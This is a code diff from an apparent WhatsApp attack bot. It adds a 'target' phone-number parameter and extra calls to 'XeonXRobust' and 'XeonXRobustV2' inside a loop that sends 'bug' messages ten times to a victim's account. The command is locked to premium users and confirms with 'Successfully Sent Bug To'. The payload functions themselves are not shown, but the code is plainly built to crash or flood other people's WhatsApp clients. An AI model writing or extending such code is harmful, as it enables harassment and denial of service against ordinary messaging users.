@@ -448,6 +448,7 @@ const wanted = {
      }
     } : {}
    );
+   console.log(chalk.redBright("XeonBug1"))
 	}
 	
 	
@@ -599,6 +600,7 @@ await viper.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 });
+console.log(chalk.blueBright("XeonBugV2"))
 }
 
 		const Porke = {
@@ -2118,6 +2120,7 @@ break
 case 'xdroid':
 if (!isPremium) return replygcxeon(mess.premium)
 	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 victim = text.split("|")[0]
 Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(Xreturn);
@@ -2138,7 +2141,9 @@ replygcxeon(`In process`)
 	await sleep(1000)
 for (let i = 0; i < 10; i++) {
 	await XeonXRobust(Xreturn, viper, (cct = true), (ptcp = true));
-        await XeonXRobustV2(Xreturn)
+    await XeonXRobustV2(Xreturn)
+    await XeonXRobust(target, o, Ptcp = true)
+    await XeonXRobustV2(target)
     }
 	sendMessageWithMentions(
     "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
